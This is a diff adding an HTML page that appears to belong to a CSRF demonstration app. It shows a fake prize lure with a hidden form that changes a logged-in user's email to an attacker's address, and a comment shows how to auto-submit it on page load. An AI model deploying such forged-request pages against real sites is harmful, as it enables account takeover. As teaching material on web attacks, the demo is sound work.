@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>You've Won a Prize!</title>
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <h1>You've Won a Prize!</h1>
+    <p>Click the button below to claim your prize!</p>
+    <!-- This form is hosted on an attacker's website. It silently submits a request
+         to the vulnerable application. If the user is logged in, their email will be changed. -->
+    <form id="csrf-form" method="post" action="http://127.0.0.1:5004/change-email-vulnerable">
+        <input type="hidden" name="email" value="hacker@example.com">
+    </form>
+    <button onclick="document.getElementById('csrf-form').submit();">Claim Prize</button>
+    <script>
+        // In a real attack, this could be submitted automatically without user interaction.
+        // For demonstration, we use a button.
+        // Example of automatic submission:
+        // window.onload = () => { document.getElementById('csrf-form').submit(); };
+    </script>
+</body>
+</html>
